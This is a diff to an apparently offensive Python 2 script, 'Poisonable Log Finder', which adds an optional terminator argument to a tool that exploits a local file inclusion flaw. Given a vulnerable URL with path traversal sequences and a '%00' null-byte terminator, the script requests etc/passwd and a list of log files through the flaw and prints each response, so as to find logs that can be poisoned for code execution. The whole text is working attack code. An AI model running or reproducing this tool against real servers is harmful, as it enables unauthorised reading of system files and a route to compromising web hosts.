@@ -1,13 +1,18 @@
 #!/usr/bin/python
-#Poisonable Log Finder V1 20170824
+#Poisonable Log Finder V1.1 20170926
 import sys
 from StringIO import StringIO
 import pycurl
 
-if len(sys.argv) != 2:
-        print "Usage: PoisonableLogFinder.py <root LFI URI>"
-	print "E.g. PoisonableLogFinder.py http://192.168.1.10/vuln/index.php?path=../../../../../../"
+if len(sys.argv) < 2 or len(sys.argv) > 3:
+        print "Usage: PoisonableLogFinder.py \"root LFI URI\" \"optional terminator\""
+	print "E.g. PoisonableLogFinder.py \"http://192.168.1.10/vuln/index.php?path=../../../../../../\" \"%00\""
         sys.exit(0)
+
+if len(sys.argv) == 2:
+	termination = " "
+else:
+	termination = sys.argv[2]
 
 URI = sys.argv[1]
 LOGS = ["etc/passwd",
@@ -106,13 +111,13 @@ LOGS = ["etc/passwd",
 for log in LOGS:
 	buffer = StringIO()
 	c = pycurl.Curl()
-	c.setopt(c.URL, '{0}{1}%00'.format(URI,log))
+	c.setopt(c.URL, '{0}{1}{2}'.format(URI,log,termination))
 	c.setopt(c.WRITEDATA, buffer)
 	c.perform()
 	c.close()
 
 	body = buffer.getvalue()
 	print("******************************************")
-	print("TESTING: {0}".format(log))
+	print("TESTING: {0}{1}".format(log,termination))
 	print("******************************************")
 	print(body)
